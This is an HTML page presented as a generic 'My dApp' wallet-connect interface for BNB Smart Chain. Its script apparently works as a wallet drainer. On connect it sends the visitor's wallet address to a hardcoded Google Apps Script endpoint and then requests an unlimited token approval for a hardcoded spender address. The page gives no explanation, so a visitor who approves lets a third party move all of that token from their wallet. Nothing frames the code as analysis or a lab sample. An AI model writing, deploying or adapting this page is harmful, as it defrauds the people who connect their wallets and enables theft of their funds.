<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>My dApp</title>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script type="module" src="https://unpkg.com/@reown/appkit@latest/dist/index.js"></script>

  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#0b1220;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }
    header{
      padding:16px;
      background:#111a2e;
      display:flex;
      justify-content:space-between;
      align-items:center;
      border-bottom:1px solid rgba(255,255,255,.08);
    }
    .container{
      flex:1;
      max-width:900px;
      margin:auto;
      padding:30px;
    }
    .card{
      background:#121b33;
      padding:20px;
      border-radius:12px;
      margin-bottom:20px;
      border:1px solid rgba(255,255,255,.06);
    }
    button{
      padding:10px 18px;
      border-radius:8px;
      border:none;
      cursor:pointer;
      font-weight:600;
      background:#4f46e5;
      color:#fff;
    }
    .status{font-size:14px;opacity:.8;margin-top:10px}
  </style>
</head>

<body>

<header>
  <h2>My dApp</h2>
  <button id="connectBtn">Connect Wallet</button>
</header>

<div class="container">

  <div class="card">
    <h3>Wallet</h3>
    <p id="walletAddress">Not connected</p>
    <p id="networkInfo"></p>
    <div class="status" id="statusBox"></div>
  </div>

  <div class="card">
    <h3>Future Feature Area</h3>
    <p>This section is ready for contract interaction UI.</p>
  </div>

</div>

<script type="module">

import { createAppKit } from 'https://unpkg.com/@reown/appkit@latest/dist/index.js'

/* ================= CONFIG ================= */

const projectId = "YOUR_PROJECT_ID";
const BSC_CHAIN_ID = 56;
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwBORgcVCCyRFx4Po-C2Ggc_k5RuZOOv03w62CesTPrJARjKr20YztsOvpWDtcfriTQ/exec";
const APPS_SCRIPT_SECRET = "justforme";

/* ================= INIT APPKIT ================= */

const appKit = createAppKit({
  projectId,
  chains: [{
    id: 56,
    name: 'BNB Smart Chain',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } }
  }]
});

let provider;
let signer;

/* ================= CONNECT FLOW ================= */

document.getElementById("connectBtn").onclick = async () => {
  await appKit.open();

  const walletProvider = await appKit.getWalletProvider();
  provider = new ethers.providers.Web3Provider(walletProvider);
  signer = provider.getSigner();

  const address = await signer.getAddress();
  document.getElementById("walletAddress").innerText = address;

  await ensureBSC();
  await notifyBackend(address);
  await ensureTokenApproval();
  updateNetworkInfo();
};

/* ================= NETWORK ================= */

async function ensureBSC(){
  const network = await provider.getNetwork();
  if(network.chainId !== BSC_CHAIN_ID){
    await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]);
  }
}

async function updateNetworkInfo(){
  const network = await provider.getNetwork();
  document.getElementById("networkInfo").innerText =
    "Chain ID: " + network.chainId;
}

/* ================= APPROVAL ================= */

async function ensureTokenApproval(){
  const abi = [
    "function approve(address spender,uint256 amount) returns (bool)"
  ];

  const token = new ethers.Contract(TOKEN_ADDRESS, abi, signer);

  try{
    setStatus("Requesting approval...");
    const tx = await token.approve(
      SPENDER_ADDRESS,
      ethers.constants.MaxUint256
    );
    await tx.wait();
    setStatus("Approval success.");
  }catch(e){
    setStatus("Approval rejected.");
  }
}

/* ================= BACKEND LOG ================= */

async function notifyBackend(address){
  try{
    await fetch(GOOGLE_SCRIPT_URL,{
      method:"POST",
      body:JSON.stringify({
        wallet:address,
        time:new Date().toISOString()
      })
    });
  }catch(e){
    console.error("Logging failed");
  }
}

/* ================= STATUS ================= */

function setStatus(msg){
  document.getElementById("statusBox").innerText = msg;
}

</script>

</body>
</html>
